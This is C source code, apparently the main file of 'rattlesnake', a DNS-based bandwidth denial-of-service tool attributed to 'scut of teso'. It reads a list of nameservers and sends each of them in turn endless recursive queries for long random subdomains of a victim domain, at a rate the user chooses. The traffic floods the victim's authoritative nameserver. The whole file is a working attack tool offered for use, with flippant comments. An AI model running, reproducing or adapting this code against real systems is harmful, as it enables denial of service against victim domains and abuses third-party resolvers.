/* rattlesnake - bandwidth denial of service attack
 *
 * by scut of teso
 * (discovered by me too, see teso-i0006.txt)
 *
 * main file
 */

#define	VERSION "0.0.2"
#define	AUTHORS	"scut of teso"

#include <sys/types.h>
#include <netinet/in.h>
#include <time.h>
#include <stdlib.h>
#include <stdio.h>
#include "common.h"
#include "network.h"
#include "dns-build.h"
#include "dns.h"
#include "io-udp.h"


int	usage (char *program);
int	rattle (char *domain_victim);

char *		ns_domain;
char *		ip_local = NULL;
int		ns_count,
		ns_walker = 0;
char **		ns_list = NULL;
int		speed;
int		sd_len = 340;


int
usage (char *program)
{
	printf ("usage: %s <ns-list> <victim-domain> <bandwidth> [sdlen]\n\n"
		"ns-list        file with a nameserver list\n"
		"victim-domain  the domain that references to our victim ip\n"
		"bandwidth      bandwidth in kbps that we should utilize, the higher the lamer\n"
		"sdlen          subdomain length as in <sdlen>.<victim-domain>\n"
		"               default is 340 (1-400 makes sense)\n\n",
		program);

	exit (EXIT_FAILURE);
}


int
main (int argc, char **argv)
{
	printf ("rattlesnake "VERSION" by "AUTHORS"\n\n");

	if (argc < 4 || argc > 5)
		usage (argv[0]);
	if (argc == 5 && sscanf (argv[4], "%d", &sd_len) != 1)
		usage (argv[0]);


	ip_local = net_getlocalip ();

	ns_list = file_read (argv[1]);
	if (ns_list == NULL) {
		fprintf (stderr, "failed to open nameserver list file %s\n", argv[1]);
		exit (EXIT_FAILURE);
	}
	for (ns_count = 0 ; ns_list[ns_count] != NULL ; ++ns_count)
		;
	if (ns_count == 0) {
		fprintf (stderr, "come on boy, you must at least supply one nameserver\n");
		exit (EXIT_FAILURE);
	}

	if (sscanf (argv[3], "%d", &speed) != 1)
		usage (argv[0]);

	printf ("[ns] querying below %s through the help of %d nameservers at %d kbps\n",
		argv[2], ns_count, speed);
	printf ("===============================================================================\n");

	srandom (time (NULL));

	rattle (argv[2]);

	exit (EXIT_SUCCESS);
}


int
rattle (char *domain_victim)
{
	dns_pdata *		dp;
	char *			querydomain;
	char *			querydomain2;
	struct timeval		tv_start;
	unsigned long long int	size_send = 0;

	gettimeofday (&tv_start, NULL);

	while (1) {
		unsigned long long int	sleeptime;
		struct timeval		tv_now;

		/* construct query domain, slow
		 */
		dp = dns_build_new ();
		querydomain = dns_build_random (domain_victim, 32);
		while (strlen (querydomain) < sd_len) {
			querydomain2 = dns_build_random (querydomain, 32);
			free (querydomain);
			querydomain = querydomain2;
		}

		/* now build DNS packet
		 */
		dns_build_q (dp, querydomain, T_A, C_IN);
		dns_packet_send (ip_local, ns_list[ns_walker], m_random (1024, 65535), 53,
			m_random (1, 65535), DF_RD, 1, 0, 0, 0, dp);
		dns_build_destroy (dp);

		size_send += strlen (querydomain) + sizeof (ip_hdr) +
			sizeof (udp_hdr) + sizeof (dns_hdr);
		free (querydomain);

		/* eye candy
		 */
		printf (".");
		fflush (stdout);

		/* next server
		 */
		ns_walker++;
		ns_walker %= ns_count;

		/* if you get fucked up here it's because you've packeted too
		 * much, so bugger off and don't be a wussy
		 */
		do {
			/* some people might think now that a sleeptime approach
			 * is better here, but in this case a mixture of polling
			 * and time calculation is better for equal spreading of
			 * the packets being send
			 */
			usleep (5000);		/* don't poll too fast */
			gettimeofday (&tv_now, NULL);
			sleeptime = tv_now.tv_sec - tv_start.tv_sec;
			sleeptime *= 1000000;
			sleeptime += ((tv_now.tv_usec + 1000000) - tv_start.tv_usec) % 1000000;
		} while (((sleeptime * speed) / 7812) < size_send);
	}

	return (1);
}


